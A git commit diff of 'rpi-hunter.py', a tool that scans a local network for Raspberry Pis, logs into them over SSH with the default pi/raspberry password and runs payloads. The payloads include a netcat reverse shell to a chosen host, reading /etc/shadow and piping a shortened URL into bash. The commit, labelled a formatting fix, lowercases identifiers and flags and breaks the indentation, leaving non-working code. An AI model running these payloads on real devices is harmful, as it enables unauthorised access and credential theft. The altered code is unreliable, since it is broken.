c927021dc84ed4fe1ba3306927ffba39533d92cb
BusesCanFly <vanya.gorbachev@gmail.com>
2019-02-19 09:24:59 -0500

    Properly formatted :)

--- rpi-hunter.py
+++ rpi-hunter.py
@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/python2.7
 # -*- coding: utf-8 -*-
 import os
 import argparse
@@ -8,46 +8,46 @@ main_color='yellow'
 sub_color='blue'
 line_color='red'
 
-parser = argparse.ArgumentParser()
+parser = argparse.argumentparser()
 parser.add_argument('--list', action='store_true',
-                   help='List avalible payloads')
+				   help='list available payloads')
 parser.add_argument('--no-scan', dest='no_scan', action='store_true',
-                    help='Disable ARP scanning')
+					help='disable arp scanning')
 parser.add_argument('-r', dest='ip_range', type=str, default='--localnet',
-                    help='IP range to scan')
-parser.add_argument('-f', dest='ip_list', type=str, default='./scan/RPI_list',
-                    help='IP list to use (Default ./scan/RPI_list)')
+					help='ip range to scan')
+parser.add_argument('-f', dest='ip_list', type=str, default='./scan/rpi_list',
+					help='ip list to use (default ./scan/rpi_list)')
 
 parser.add_argument('-u', dest='uname', type=str, default='pi',
-                    help='Username to use when ssh\'ing')
+					help='username to use when ssh\'ing')
 parser.add_argument('-c', dest='creds', type=str, default='raspberry',
-                    help='Password to use when ssh\'ing')
+					help='password to use when ssh\'ing')
 
 parser.add_argument('--payload', type=str, default='whoami',
-		    help='(Name of, or raw) Payload [ex. reverse_shell or \'whoami\']')
+			help='(name of, or raw) payload [ex. reverse_shell or \'whoami\']')
 
-parser.add_argument('-H', dest='host', type=str,
-                    help='(If using reverse_shell payload) Host for reverse shell')
-parser.add_argument('-P', dest='port', type=str,
-                    help='(If using reverse_shell payload) Port for reverse shell')
+parser.add_argument('-h', dest='host', type=str,
+					help='(if using reverse_shell payload) host for reverse shell')
+parser.add_argument('-p', dest='port', type=str,
+					help='(if using reverse_shell payload) port for reverse shell')
 
 parser.add_argument('--safe', action='store_true',
-		   help='Print sshpass command, but don\'t execute it')
+		   help='print sshpass command, but don\'t execute it')
 parser.add_argument('-q', dest='quiet', action='store_true',
-                   help='Don\'t print banner or ARP scan output')
+				   help='don\'t print banner or arp scan output')
 args = parser.parse_args()
 
-#payload= 'echo "raspberry" | sudo -S whoami'
+#payload= 'echo "raspberry" | sudo -s whoami'
 
 payloads={
-'reverse_shell':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+str(args.host)+' '+str(args.port)+' >/tmp/fC',
+'reverse_shell':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+str(args.host)+' '+str(args.port)+' >/tmp/fc',
 'apt_update':'sudo apt update && sudo apt -y upgrade',
 'raincow_install':'sudo apt -y install fortune cowsay lolcat',
 'gitpip':'sudo apt -y install git python-pip',
 'shadow':'sudo cat /etc/shadow',
-'motd':'echo "CHANGE YOUR PASSWORD" > /etc/motd',
+'motd':'echo "change your password" > /etc/motd',
 'raincow_bashrc':'sudo echo "fortune | cowsay | lolcat" >> ~/.bashrc',
-'rickroll':'curl -s -L http://bit.ly/10hA8iC | bash'
+'rickroll':'curl -s -l http://bit.ly/10ha8ic | bash'
 }
 
 if args.payload in payloads:
@@ -62,54 +62,56 @@ else:
 	quiet=''
 
 def list():
-        l=0
-        cprint("Payloads:", "green")
-	print colored("Specify with --payload", "green"), colored("name\n", "yellow")
+	l=0
+	cprint("payloads:", "green")
+	print colored("specify with --payload", "green"), colored("name\n", "yellow")
 	for key,value in payloads.items():
 		print colored('['+key+']', 'yellow'), colored(value, 'white')
-	print '\n'
+	print('\n')
+
 
 def scan():
 	if not args.no_scan and not args.safe:
-		os.system('sudo arp-scan -g '+args.ip_range+' -W ./scan/scan.pcap'+quiet)
-                os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
-                os.system('cat ./scan/pcap.txt | grep -i "Rasp" > ./scan/raspi_list')
-                os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/RPI_list')
-                os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
-                cprint('\nLocated '+ str(sum(1 for line in open ('./scan/RPI_list'))) + ' Raspi\'s', 'yellow')
+		os.system('sudo arp-scan -g '+args.ip_range+' -w ./scan/scan.pcap'+quiet)
+				os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
+				os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
+				os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/rpi_list')
+				os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
+				cprint('\nlocated '+ str(sum(1 for line in open ('./scan/rpi_list'))) + ' raspi\'s', 'yellow')
 
-def RPI():
-	cprint('\nLoaded '+ str(sum(1 for line in open (args.ip_list))) + ' IP\'s\n\n', 'yellow')
+def rpi():
+	cprint('\nloaded '+ str(sum(1 for line in open (args.ip_list))) + ' ip\'s\n\n', 'yellow')
 
-        list = args.ip_list
-        with open(list) as inf:
-                lines = [line.strip() for line in inf]
-        i=0
-	cprint("Sending payload to Pi\'s", "yellow")
-	cprint("Godspeed, little payloads\n", "green")
+		list = args.ip_list
+		with open(list) as inf:
+				lines = [line.strip() for line in inf]
+		i=0
+	cprint("sending payload to pi\'s", "yellow")
+	cprint("godspeed, little payloads\n", "green")
 
-        while i < len(lines):
-		print colored("Sending payload to ", "yellow"), colored(lines[i], "yellow")
+		while i < len(lines):
+		print colored("sending payload to ", "yellow"), colored(lines[i], "yellow")
 		if args.safe:
-			print("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no "+args.uname+"@"+lines[i]+" "+payload)
+			print("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+lines[i]+" "+payload)
 		else:
-			os.system("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no "+args.uname+"@"+lines[i]+" "+payload)
+			os.system("sshpass -p \""+args.creds+"\" ssh -o stricthostkeychecking=no "+args.uname+"@"+lines[i]+" "+payload)
 			print("\n")
 		i+=1
-	exit
+	exit()
 
 def art():
-        print '\n'
-        cprint("██████╗ ██████╗ ██╗      ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ", main_color)
-        cprint("██╔══██╗██╔══██╗██║      ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗", main_color)
-        cprint("██████╔╝██████╔╝██║█████╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝", main_color)
-        cprint("██╔══██╗██╔═══╝ ██║╚════╝██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗", main_color)
-        cprint("██║  ██║██║     ██║      ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║", main_color)
-        cprint("╚═╝  ╚═╝╚═╝     ╚═╝      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝", main_color)
-        cprint("-----------------------------------------------------------------------------", line_color)
-        cprint("      BusesCanFly                                           76 32 2e 30      ", sub_color)
-        cprint("-----------------------------------------------------------------------------", line_color)
-        print '\n'
+		print('\n')
+		cprint("██████╗ ██████╗ ██╗      ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ", main_color)
+		cprint("██╔══██╗██╔══██╗██║      ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗", main_color)
+		cprint("██████╔╝██████╔╝██║█████╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝", main_color)
+		cprint("██╔══██╗██╔═══╝ ██║╚════╝██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗", main_color)
+		cprint("██║  ██║██║     ██║      ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║", main_color)
+		cprint("╚═╝  ╚═╝╚═╝     ╚═╝      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝", main_color)
+		cprint("-----------------------------------------------------------------------------", line_color)
+		cprint("      BusesCanFly                                           76 32 2e 30      ", sub_color)
+		cprint("-----------------------------------------------------------------------------", line_color)
+		print('\n')
+
 
 if not args.quiet:
 	art()
@@ -118,4 +120,4 @@ if args.list:
 	list()
 else:
 	scan()
-       	RPI()
+	rpi()
